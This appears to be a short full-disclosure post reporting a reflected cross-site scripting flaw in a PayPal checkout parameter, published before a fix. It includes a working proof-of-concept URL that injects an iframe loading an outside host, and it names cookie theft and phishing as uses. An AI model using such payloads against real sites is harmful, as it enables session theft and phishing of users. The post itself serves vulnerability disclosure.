Subject: XSS in www.paypal.com

Hello,

I have found a XSS bug in www.paypal.com domain,
it could be used to inject any code in the context of user browser.

It can be used to steal cookies of paypal users, fishing attacks, java
execution, etc.

The parameter "on0" is vulnerable to XSS.
Here is the POC code:
https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=UPWVULJWYUVT6&on0=<iframe
src=//nimb.cc/>asdasd&os0=1208171032&on1=asd&os1=NUEVA ALMACEN DE BARRIO
CENTRICO EN BUENOS AIRES INTERESADA EN ABASTECIMIENTO DE PRODUCTOS KOSHER"'

There is only one limitation, the maximum size are 23 chars,
but it can be easily bypassed as it was demonstrated in POC code.


The bug still unpatched at this moment. I have reported this issue to
Paypal security team 6 days ago, they replied me that "this bug was
reported by another researcher", but nothing else.

Paypal is a big company that does not have good protocols to deal with
security flaws, so I decided to publish it.

Thank you,
Jose Antonio PÃ©rez Piedra.
